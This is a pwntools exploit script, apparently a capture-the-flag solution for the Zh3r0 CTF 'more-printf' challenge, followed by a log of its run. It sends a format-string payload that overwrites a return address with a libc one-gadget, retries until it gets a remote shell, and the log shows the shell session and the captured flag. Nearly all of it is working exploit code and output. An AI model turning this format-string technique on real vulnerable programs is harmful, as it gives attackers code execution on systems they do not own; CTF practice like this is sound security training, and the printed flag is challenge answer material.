#!/usr/bin/python3

from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './more-printf'
elf  = ELF(BINARY)

for i in range(100):
  print(i)
  if len(sys.argv) > 1 and sys.argv[1] == 'r':
    HOST = "pwn.zh3r0.cf"
    PORT = 2222
    s = remote(HOST, PORT)
  else:
    s = process(BINARY)

  # 0x7ffff7a03bf7 - 7ffff79e2000 = 0x21bf7
  # 0x4f3d5 - 0x21bf7 - 8 = 0x2d7d6 = 186326
  s.sendline("%c%c%c%5c%hhn%*8$c%186326c%5$n")
  s.sendline("id") 
  try:
    r = s.recvuntil("\n")  
    print(r)
    s.interactive()
  except:
    s.close()

'''
mito@ubuntu:~/CTF/Zh3r0_CTF_V2/Pwn_More_Printf/public/vuln$ python3 solve.py r
[*] '/home/mito/CTF/Zh3r0_CTF_V2/Pwn_More_Printf/public/vuln/more-printf'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./'
0
[+] Opening connection to pwn.zh3r0.cf on port 2222: Done
[*] Closed connection to pwn.zh3r0.cf port 2222
1
[+] Opening connection to pwn.zh3r0.cf on port 2222: Done
[*] Closed connection to pwn.zh3r0.cf port 2222
2
...
55
[+] Opening connection to pwn.zh3r0.cf on port 2222: Done
[*] Closed connection to pwn.zh3r0.cf port 2222
56
[+] Opening connection to pwn.zh3r0.cf on port 2222: Done
[*] Closed connection to pwn.zh3r0.cf port 2222
57
[+] Opening connection to pwn.zh3r0.cf on port 2222: Done
b'uid=1000(user) gid=1000(user) groups=1000(user)\n'
[*] Switching to interactive mode
$ ls -l
total 17700
-rw-rw-rw- 1 root root       40 Jun  3 20:08 flag
-rwxrwxrwx 1 root root   179152 Jun  3 20:08 ld-2.27.so
-rw-rw-rw- 1 root root 17879584 Jun  3 20:08 libc.so.6
-rwxrwxrwx 1 root root    25336 Jun  3 20:08 more-printf
-rw-rw-rw- 1 root root      529 Jun  3 20:08 more-printf.c
-rw-rw-rw- 1 root root       67 Jun  3 20:08 run.sh
-rwxrwxrwx 1 root root    18744 Jun  3 20:08 ynetd
$ cat flag
zh3r0{5aeb93e42479d5ee0795bda6e533df0e}
'''
